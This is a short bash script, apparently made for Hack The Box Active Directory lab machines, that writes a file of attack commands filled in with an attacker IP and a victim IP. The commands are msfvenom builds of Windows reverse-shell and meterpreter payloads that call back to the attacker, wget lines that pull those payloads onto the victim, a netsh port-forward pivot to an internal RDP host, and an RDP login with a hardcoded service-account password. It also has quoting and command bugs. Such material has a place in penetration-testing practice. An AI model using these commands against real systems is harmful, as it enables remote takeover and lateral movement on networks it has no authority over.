#!/bin/bash

# Script is used for making files for HTB AD path boxes

# Usage supply IP address of attack box then VIC box
# i.e. .starting_scripts.sh 10.10.10.15 102.30.3.3

attkIP=$1
vicIP=$2

if [[ -z "$attkIP" || -z "$vicIP" ]]; then
    echo "Usage: $0 <attack box IP> <victim IP>"
    exit 1
fi

# Continue with your script here...
sudo touch codes.txt
sudo nano 777 codes.txt
echo "msfvenom -p windows/x64/shell/reverse_tcp LHOST=$1 LPORT=4444 -f exe -o 1franco.exe" >> codes.txt
echo "msfvenom -p  windows/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=4444 -f exe -o 1franco_hacker.exe" >> codes.txt
echo "wget "http://$1:8888/1franco_hacker.exe" -OutFile ".\1franco_hacker.exe"" >> codes.txt
echo "wget "http://$1:8888/1franco.exe" -OutFile ".\1franco.exe"" >> codes.txt
echo "netsh interface portproxy add v4tov4 listenport=1515 listenaddress=$2 connectport=3389 connectaddress=172.16.6.50'" >> codes.txt
echo "xfreerdp /u:svc_sql /p:lucky7 /v:$2:1515" >> codes.txt
echo "EOF"  >> codes.txt
echo "File has been created containing verbages:"; ls -la | grep codes
